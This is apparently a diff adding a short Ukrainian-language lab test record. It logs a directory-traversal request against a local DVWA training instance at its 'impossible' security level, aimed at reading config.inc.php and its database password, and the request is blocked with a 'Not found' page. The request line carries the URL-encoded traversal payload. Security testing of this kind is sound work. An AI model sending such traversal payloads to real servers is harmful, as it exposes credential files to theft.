@@ -1,0 +1,19 @@
+# V8. Обхід каталогів у view_source.php → код config.inc.php (пароль БД)
+
+Рівень безпеки DVWA: impossible
+
+Результат: заблоковано (HTTP 200)
+
+
+
+### GET view_source.php?id=fi&security=../../../config/config.inc
+>>> GET http://127.0.0.1:8081/vulnerabilities/view_source.php?id=fi&security=..%2F..%2F..%2Fconfig%2Fconfig.inc
+>>> Cookie: security=impossible; PHPSESSID=53678834fb3bc88ddcee1fad31094333
+<<< HTTP 200 OK
+<<< Content-Type: text/html;charset=utf-8
+<<< Content-Length: 302
+<<< (фрагмент тіла; HTML-теги прибрано для читабельності)
+
+		Damn Vulnerable Web Application (DVWA)Source :: Damn Vulnerable Web Application (DVWA)
+			Not found
+
